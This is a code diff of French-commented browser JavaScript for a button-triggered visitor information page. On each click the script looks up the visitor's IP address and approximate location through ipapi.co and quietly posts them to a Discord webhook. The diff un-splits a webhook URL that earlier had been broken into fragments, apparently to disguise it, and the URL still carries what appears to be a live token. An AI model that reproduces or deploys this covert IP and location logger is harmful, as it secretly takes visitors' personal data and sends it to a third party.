@@ -2,15 +2,9 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
     // Fonction pour obtenir l'URL du webhook Discord
     function getWebhookUrl() {
         // Remplacez les parties par les segments de votre URL de webhook Discord
-        let part1 = 'https://dis';
-        let part2 = 'cord.co';
-        let part3 = 'm/api/we';
-        let part4 = 'bhooks';
-        let part5 = '12436525502';
-        let part6 = '51515914/SrRtaX';
-        let part7 = '_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImf';
-        let part8 = 'e-XgBBlDcT6r_00VU';
-        return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
+        let part1 = 'https://discord.com/api/webhooks/1243652550251515914';
+        let part2 = 'SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';
+        return `${part1}/${part2}`;
     }
 
     fetch('https://ipapi.co/json/') // Utilisation de l'API sécurisée ipapi.co
@@ -22,10 +16,13 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
         })
         .then(data => {
             if (data) {
+                // Extraire l'adresse IP au format IPv4
+                let ipAddress = data.ip.split(',')[0]; // Prendre la première adresse IP si elle est multiple
+
                 let message = {
                     content: `
                         **Utilisateur a cliqué sur le bouton**
-                        \nL'adresse IP est : ${data.ip}
+                        \nL'adresse IP est : ${ipAddress}
                         \nLocalisation approximative :
                         \nLatitude : ${data.latitude}, Longitude : ${data.longitude}
                         \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country_name}
@@ -53,7 +50,7 @@ document.getElementById('get-info-btn').addEventListener('click', function() {
                 });
 
                 document.getElementById('info-display').innerText = `
-                    Votre adresse IP est : ${data.ip}
+                    L'adresse IP est : ${ipAddress}
                     \nLocalisation approximative :
                     \nLatitude : ${data.latitude}, Longitude : ${data.longitude}
                     \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country_name}
